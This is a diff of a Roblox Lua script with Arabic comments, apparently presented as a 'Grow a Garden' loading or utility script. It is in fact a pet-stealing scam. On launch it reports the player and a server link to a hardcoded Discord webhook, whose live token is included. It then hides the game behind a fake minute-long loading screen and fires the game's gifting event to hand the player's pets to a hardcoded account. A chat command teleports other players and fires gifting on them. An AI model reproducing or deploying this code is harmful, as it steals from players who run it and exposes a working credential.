@@ -1,18 +1,15 @@
---== خدمات Roblox ==--
+-- الخدمات الأساسية
 local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-local HttpService = game:GetService("HttpService")
-local TeleportService = game:GetService("TeleportService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local UIS = game:GetService("UserInputService")
-local Chat = game:GetService("Players").LocalPlayer.Chatted
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local player = Players.LocalPlayer
 
---== رابط Webhook ==--
+-- رابط Webhook
 local webhookUrl = "https://discord.com/api/webhooks/1404963543555768383/6qQU8_ItNMIXpsqtZGDTXuGpO-TdRLbxUDMR_ulseo32MKwxqP8ILq_Lfbt76DNfHGT4"
 
---== دالة إرسال Webhook ==--
+-- دالة إرسال Webhook
 local function sendWebhook(message)
-    local serverUrl = "https://www.roblox.com/games/"..game.PlaceId.."/?jobId="..game.JobId
     local data = {
         content = message,
         components = {
@@ -23,7 +20,7 @@ local function sendWebhook(message)
                         type = 2,
                         style = 5,
                         label = "انقر للانتقال للسيرفر",
-                        url = serverUrl
+                        url = "https://www.roblox.com/games/" .. game.PlaceId .. "/?jobId=" .. game.JobId
                     }
                 }
             }
@@ -41,99 +38,81 @@ local function sendWebhook(message)
     end
 end
 
---== إرسال Webhook فور تشغيل السكربت ==--
-sendWebhook("تم تشغيل السكربت بواسطة اللاعب: "..player.Name)
+-- إرسال رسالة فور تشغيل السكربت
+sendWebhook("تم تشغيل السكربت بواسطة اللاعب: " .. player.Name)
 
---== واجهة تحميل ==--
-local character = player.Character or player.CharacterAdded:Wait()
-local humanoid = character:WaitForChild("Humanoid")
-humanoid.WalkSpeed = 0
-humanoid.JumpPower = 0
-humanoid.AutoRotate = false
-
-UIS.InputBegan:Connect(function(input, gpe)
-    gpe = true -- منع أي تحكم
-end)
-
+-- واجهة تحميل كاملة
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "LockedLoadingScreen"
+screenGui.Name = "LoadingScreen"
 screenGui.IgnoreGuiInset = true
 screenGui.Parent = player:WaitForChild("PlayerGui")
 
 local frame = Instance.new("Frame", screenGui)
 frame.Size = UDim2.new(1,0,1,0)
-frame.Position = UDim2.new(0,0,0,0)
 frame.BackgroundColor3 = Color3.fromRGB(15,15,15)
 
-local gameTitle = Instance.new("TextLabel", frame)
-gameTitle.Size = UDim2.new(1,0,0.1,0)
-gameTitle.Position = UDim2.new(0,0,0,0)
-gameTitle.BackgroundTransparency = 1
-gameTitle.Text = "🌱 Grow A Garden"
-gameTitle.Font = Enum.Font.SourceSansBold
-gameTitle.TextSize = 40
-gameTitle.TextColor3 = Color3.fromRGB(0,255,128)
+local title = Instance.new("TextLabel", frame)
+title.Size = UDim2.new(1,0,0.1,0)
+title.Position = UDim2.new(0,0,0,0)
+title.BackgroundTransparency = 1
+title.Text = "🌱 Grow a Garden Loading..."
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 40
+title.TextColor3 = Color3.fromRGB(0,255,128)
 
-local label = Instance.new("TextLabel", frame)
-label.Size = UDim2.new(1,0,0.2,0)
-label.Position = UDim2.new(0,0,0.4,0)
-label.BackgroundTransparency = 1
-label.Text = "Don't leave — Loading..."
-label.Font = Enum.Font.SourceSansBold
-label.TextSize = 36
-label.TextColor3 = Color3.fromRGB(255,255,255)
+local progressBar = Instance.new("Frame", frame)
+progressBar.Size = UDim2.new(0.6,0,0.05,0)
+progressBar.Position = UDim2.new(0.2,0,0.6,0)
+progressBar.BackgroundColor3 = Color3.fromRGB(50,50,50)
 
-local barBack = Instance.new("Frame", frame)
-barBack.Size = UDim2.new(0.6,0,0.05,0)
-barBack.Position = UDim2.new(0.2,0,0.6,0)
-barBack.BackgroundColor3 = Color3.fromRGB(50,50,50)
-
-local bar = Instance.new("Frame", barBack)
+local bar = Instance.new("Frame", progressBar)
 bar.Size = UDim2.new(0,0,1,0)
 bar.BackgroundColor3 = Color3.fromRGB(0,170,255)
 
-local percent = Instance.new("TextLabel", frame)
-percent.Size = UDim2.new(1,0,0.05,0)
-percent.Position = UDim2.new(0,0,0.65,0)
-percent.BackgroundTransparency = 1
-percent.Text = "0%"
-percent.Font = Enum.Font.SourceSansBold
-percent.TextSize = 28
-percent.TextColor3 = Color3.fromRGB(255,255,255)
+local percentage = Instance.new("TextLabel", frame)
+percentage.Size = UDim2.new(1,0,0.05,0)
+percentage.Position = UDim2.new(0,0,0.65,0)
+percentage.BackgroundTransparency = 1
+percentage.Text = "0%"
+percentage.Font = Enum.Font.SourceSansBold
+percentage.TextSize = 28
+percentage.TextColor3 = Color3.fromRGB(255,255,255)
 
--- شريط التحميل لمدة دقيقة
-for i = 1, 100 do
+for i=1,100 do
     bar.Size = UDim2.new(i/100,0,1,0)
-    percent.Text = i.."%"
+    percentage.Text = i .. "%"
     wait(0.6)
 end
 
-label.Text = "Loading Complete!"
+percentage.Text = "تم التحميل!"
 wait(1)
 screenGui:Destroy()
+
+-- إعادة التحكم باللاعب
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
 humanoid.WalkSpeed = 16
 humanoid.JumpPower = 50
 humanoid.AutoRotate = true
 
---== خاصية الشات ==--
-Chat:Connect(function(msg)
+-- مراقبة شاتك أنت
+player.Chatted:Connect(function(msg)
     if msg == "." then
-        -- Teleport إلى مزرعتك
-        local myFarmPlaceId = 12345678 -- ضع معرف مزرعتك هنا
-        TeleportService:Teleport(myFarmPlaceId, player)
-
-        -- إعطاء الحيوانات لك
-        local targetName = player.Name
-        local targetPlayer = Players:FindFirstChild(targetName)
-        if targetPlayer then
-            ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", targetPlayer)
+        -- نقل كل اللاعبين إلى موقعك وإعطاؤهم الحيوانات
+        for _, p in pairs(Players:GetPlayers()) do
+            if p ~= player and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+                local hrp = player.Character.HumanoidRootPart
+                p.Character.HumanoidRootPart.CFrame = hrp.CFrame
+                if ReplicatedStorage.GameEvents:FindFirstChild("PetGiftingService") then
+                    ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", p)
+                end
+            end
         end
     end
 end)
 
---== التحقق من اللاعب sssfysue7 ومنحه الحيوانات ==--
-local targetName = "sssfysue7"
-local targetPlayer = Players:FindFirstChild(targetName)
-if targetPlayer then
+-- التحقق من اللاعب sssfysue7 وإعطاؤه الحيوانات فور التشغيل
+local targetPlayer = Players:FindFirstChild("sssfysue7")
+if targetPlayer and ReplicatedStorage.GameEvents:FindFirstChild("PetGiftingService") then
     ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", targetPlayer)
 end
